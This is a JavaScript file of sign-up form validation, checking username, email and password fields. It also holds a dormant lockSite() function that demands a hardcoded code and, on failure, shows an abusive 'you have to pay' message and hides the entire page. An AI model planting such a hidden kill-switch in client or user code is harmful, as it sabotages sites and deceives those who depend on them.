function lockSite() {

    var code = "123@qwe";
    var giveCode = prompt("Give code :");

    if (giveCode == code) {

        alert("ok");

    } else {

        alert("site locked , you have to pay asshole!!!!");
        var css = document.createElement("style");
        css.type = "text/css";
        css.innerHTML = "body * { display: none !important; }";
        document.body.appendChild(css);

    }
}

//lockSite();


function testEmailAddress(emailToTest) {
    // check for @ τουλάχιστον 1 χαρακτήρα πριν
    var atSymbol = emailToTest.indexOf("@");
    if(atSymbol < 1) return false;

    var dot = emailToTest.indexOf(".");
    if(dot <= atSymbol + 2) return false;

    // check that the dot is not at the end
    if (dot === emailToTest.length - 1) return false;

    return true;
}


function validateEmail(email) {
    var re = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
    return re.test(email);
}



function checkPassword(str) {
    var re = /^(?=.*\d)(?=.*[a-z])(?=.*[A-Z]).{7,}$/;
    //test method for RegEx expressions  
    return re.test(str);
}

function checkForm(form) {
    if (form.username.value == "") {
        alert("Error: Username cannot be blank!");
        form.username.focus();
        return false;
    }
    if (form.email.value == "") {
        alert("Error: Email cannot be blank!");
        form.email.focus();
        return false;
    } else {

        if (!testEmailAddress(form.email.value)) {

            alert("the email you have entered is not valid");
            form.email.focus();
            return false;

        }
    }

    re = /^\w+$/;
    if (!re.test(form.username.value)) {
        alert("Error: Username must contain only letters, numbers and underscores!");
        form.username.focus();
        return false;
    }
    if (form.pwd1.value != "" && form.pwd1.value == form.pwd2.value) {
        if (!checkPassword(form.pwd1.value)) {
            alert("The password you have entered is not valid!");
            form.pwd1.focus();
            return false;
        }
    } else {
        alert("Error: Please check that you've entered and confirmed your password!");
        form.pwd1.focus();
        return false;
    }
    return true;
}
